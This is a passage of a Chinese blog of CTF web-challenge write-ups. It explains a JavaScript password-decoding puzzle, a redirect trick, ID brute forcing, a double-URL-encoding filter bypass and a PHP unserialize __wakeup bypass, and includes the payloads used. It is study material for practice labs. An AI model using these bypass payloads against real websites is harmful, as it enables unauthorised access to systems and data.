class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)变量赋值代码分析：<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">一开始<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,没有赋值，为<span class="variable">undefined</span>，其它参数<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>，<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>，后来<span class="variable">i</span>被赋值<span class="operator">=</span><span class="number">0</span>，<span class="variable">j</span>被赋值为<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)第九行此时<span class="variable">n</span>被赋值为<span class="number">0</span>，所以<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>，最后等于<span class="number">11</span>    注：这里的(<span class="variable">l</span>)其中是英文字母<span class="variable">l</span>，不是数字<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)第十行中，<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)第一个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">解释：前面的<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]是无用的，因为后面会被<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]的值重新覆盖</span><br><span class="line">第一次循环：<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>英文字母<span class="variable">F</span></span><br><span class="line">第二次<span class="operator">...</span></span><br><span class="line">第三次<span class="operator">...</span></span><br><span class="line">第四次<span class="operator">...</span></span><br><span class="line">第五次<span class="operator">...</span></span><br><span class="line">所以，这个<span class="keyword">for</span>循环，最后的<span class="variable">p</span>为（尽管没有输出出来，这里我们知道就好）<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)第二个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">解释：这里的<span class="keyword">for</span>循环和上面的差不多，注意这里的<span class="variable">p</span>值由于第一次<span class="keyword">for</span>循环执行后现在已经是<span class="variable">FAUX</span> <span class="variable">P</span>了</span><br><span class="line">加上第一次<span class="keyword">for</span>循环的<span class="variable">p</span>值，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">因为<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">所以：<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">因此，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> 即 <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> 最后函数输出为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">嗯哼？？？这个函数就执行完了？？？我的<span class="variable">tab</span>数组怎么没有用到？？？，我一开始带进来的参数呢？去哪了？别想了，输出值虽然用到了带进来的参数(就是分割后的<span class="variable">tab</span>数组)，但是<span class="keyword">for</span>循环那里人家直接使用<span class="variable">tab2</span>数组相关代码的值，根本没有用到<span class="variable">tab</span>数组的值，所以由于代码逻辑问题，你传入的<span class="variable">dechiffre</span>的参数<span class="variable">pass_enc</span>是没有任何意义的</span><br><span class="line"></span><br><span class="line">三、<span class="variable">dechiffre</span>函数执行完成后，继续执行其它的代码</span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>你输入弹框内的内容</span><br><span class="line">之后<span class="variable">alert</span>弹出<span class="title function_">dechiffre</span>(<span class="variable">h</span>)的值，由前面所有的代码可知，代码里<span class="variable">p</span>的值与<span class="variable">tab</span>无关，因为最终都会被<span class="variable">tab2</span>的值替代，所以我们无论输入什么，也就是<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>，无论输入的这个<span class="variable">h</span>等于什么，不管<span class="variable">tab</span>能否被分割成字符串数组，是否存在，都只会利用到<span class="variable">tab2</span>。通俗点讲，有关<span class="variable">tab</span>的参数与值都可以视为没有，因此，<span class="variable">pass_enc</span>参数是什么也就没有意义了</span><br><span class="line"></span><br><span class="line">四、最后，结论就是，无论我们在弹框中输入什么值，都只会返回<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">我就猜想，会不会<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));这个语法错误，并且没有没计算出来的是不是最后正确的值，也就是<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">于是，我不用它这么无论<span class="variable">pass_enc</span>参数输入什么都显示<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>的函数，咱也抛弃它一回，自己重新写代码执行它</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">最后结果为：<span class="number">786</span>OsErtk12</span><br><span class="line">根据提示的<span class="variable">flag</span>格式输入最后的<span class="variable">flag</span>！</span><br></pre></td></tr></table></figure></div>

<p>注：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() 方法用于把一个字符串分割成字符串数组</span><br><span class="line">语法：<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">参数                 描述</span><br><span class="line">separator        可选。字符串或正则表达式，从该参数指定的地方分割 <span class="built_in">string</span> Object。比如此题以逗号分割成字符串数组</span><br><span class="line"><span class="built_in">limit</span>            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</span><br><span class="line">举例：str=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有<span class="number">3</span>个，结果就是1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> 循环的语法如下：</span><br><span class="line"><span class="keyword">for</span> (语句 <span class="number">1</span>; 语句 <span class="number">2</span>; 语句 <span class="number">3</span>) &#123;</span><br><span class="line">     要执行的代码块</span><br><span class="line">&#125;</span><br><span class="line">语句 <span class="number">1</span> 在循环（代码块）开始之前执行。</span><br><span class="line">语句 <span class="number">2</span> 定义运行循环（代码块）的条件。</span><br><span class="line">语句 <span class="number">3</span> 会在循环（代码块）每次被执行后执行。</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line">语法：String.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">参数                 描述</span><br><span class="line">n1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()方法用于显示可提示用户进行输入的对话框。</span><br><span class="line">这个方法返回用户输入的字符串</span><br><span class="line">语法：<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">参数                描述</span><br><span class="line">msg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。</span><br><span class="line">defaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> 属性可设置或返回数组中元素的数目。</span><br></pre></td></tr></table></figure></div>

<h1 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-题目描述-11"><a href="#1-题目描述-11" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>想想初始页面是哪个</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> 开始界面如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625162533345.png" alt="image-20220625162533345"></p>
<p>没有头绪，但是描述里有首页，再根据url知道这是个php网站</p>
<p>php网站首页文件就是index.php</p>
<p><code>index.php文件是一个php网站首页文件，index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</code></p>
<p>试试<code>111.200.241.244:59074/index.php</code></p>
<p>结果又会到1.php，url又变成<code>111.200.241.244:59074/1.php</code></p>
<p>F12打开查看网络</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171731934.png" alt="image-20220625171731934"></p>
<p><code>补充：</code></p>
<p> <code>index.php的状态是302什么意思？</code></p>
<p><code>302 Found，原始描述短语为 Moved Temporarily(临时搬家） ，是[HTTP协议](https://baike.baidu.com/item/HTTP协议)中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被**临时**改变了位置；换而言之，就是请求的资源暂时驻留在不同的URI下，故而除非特别指定了缓存头部指示，该状态码不可缓存。</code></p>
<p>发现确实是跳转到了index.php但为什么又回到1.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171819943.png" alt="image-20220625171819943"></p>
<p>可以看到location:1.php，这就是为什么无法直接访问index.php的原因，但flag已经得到</p>
<p>得到flag</p>
<hr>
<p>如果用burpsuite查看<code>111.200.241.244:59074/index.php</code>，只能看到Flag is hidden!，也算是提示</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625172122211.png" alt="image-20220625172122211"></p>
<h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-题目描述-12"><a href="#1-题目描述-12" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>打开界面有些吓人</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084029917.png" alt="image-20220626084029917"></p>
<p>但只有报表中心能打开</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084102777.png" alt="image-20220626084102777"></p>
<p>看到url就有思路了，我们可以尝试id爆破</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084318243.png" alt="image-20220626084318243"></p>
<p>利用Numbers方式，从1到5000，发现2333处成功爆破</p>
<p>得到flag</p>
<h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-题目描述-13"><a href="#1-题目描述-13" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题和上面新手区的题类似</p>
<p>先访问<code>http://111.200.241.244:51820/robots.txt</code>得到php文件名</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626090904204.png" alt="image-20220626090904204"></p>
<p>于是访问<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>
<p>得到flag</p>
<h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-题目描述-14"><a href="#1-题目描述-14" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>这句话的意思是”你能证明这个网站存在吗“</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626104943938.png" alt="image-20220626104943938"></p>
<p>没有思路，抓包，和御剑、dirsearch都没又得到想要的结果</p>
<p>没有办法，搜了一下大佬们的wp</p>
<p>了解到了一个新的知识点phps</p>
<p><code>phps即为PHP Source：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</code></p>
<p>访问<code>http://111.200.241.244:51703/index.phps</code>，得到源码内容</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626105416606.png" alt="image-20220626105416606"></p>
<p>右键查看源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure></div>

<p>根据代码知道，当id=admin，输出not allowed!，但是想要输出flag</p>
<p>就需要注意这句语句<code>$_GET[id] = urldecode($_GET[id]);</code></p>
<p><code>urldecode:本函数对字符串进行URL解码。例如通过urlencode编码后的字符串，可通过UrlDecode进行解码。对Url路径加码的函数是UrlEncode  用法相反，和UrlDecode是一致对应的</code></p>
<p>这里我们就清楚了，需要把admin进行url编码，但是只对其进行一次编码，要知道网站本身对url编码就有解码的能力，也就是在urldecode函数执行之前，网站已经把编码解码为admin，从而只输出not allowed!</p>
<p>所以，这里需要对admin进行两次编码，第一被网站解码，绕过第一个if，然后在urldecode函数里进行第二次解码，变成admin，从而输出Key(flag)</p>
<p>于是访问<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>
<p>这里的%25%36%31是字母a的二次url编码由a第一次编码结果%61再次编码而成</p>
<p>–为了payload简洁，一般只编码一个字母</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626110642311.png" alt="image-20220626110642311"></p>
<p>得到flag</p>
<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>该题属于ssti，建议先了解一些<a href="../../../../2022/05/28/Web-study">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>然后再做这道题</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬wp</a></p>
<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-题目描述-15"><a href="#1-题目描述-15" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字可知，这是道<a href="../../../../2022/05/28/Web-study">php反序列化</a>类型的题</p>
<p>开始先分析一下php代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">php代码审计原文链接</a></p>
<p>首先定义了Demo类，在类中定义了几个方法<code>construct()wakeup()destruct()</code>。在这里我们要知道，</p>
<p>php中<u>类实例化的时候，首先运行wakeup()函数</u>，</p>
<p>在<u>序列化时先运行sleep()函数</u>,</p>
<p>在<u>反序列化时先运行wakeup()</u>，</p>
<p>在脚本结束调用destruct()函数。 </p>
<p>继续审计代码，下面的if语句中，先用了base64的解码函数，进行了一次解码，又用一个正则表达式进行过滤，只有base64编码并通过正则表示式才能进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/2a59ae6529004d458c4321c9d547fd00.png#pic_center" alt="在这里插入图片描述"></p>
<p>这里的正则表达式<code>’/[oc]:\d+:/i’</code> 表示了以O或者C开头接：接数字，数字至少出现一次或者无数次，忽略大小写，所以我们将<code>O:4改为O:+4</code>则可通过正则表达式，因为在PHP代码里，+4就是4，所以绕过了正则匹配同时也不影响代码正常含义</p>
<p>这里看到了fl4g.php，先把它实例化，这里改一下代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);<span class="comment">//这里相当于给flie赋值，类中多个值用&quot;,&quot;隔开即可，按赋值顺序，Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://tool.lu/coderunner/">运行PHP代码</a></p>
<p>得到<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>这里看到有一个__wakeup，所以还要改一下属性值1为2</p>
<p>–&gt;</p>
<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p><strong>注意：</strong>这里有一个大坑让我卡了好久</p>
<p>先看下面这个图理解一下上面的语句</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
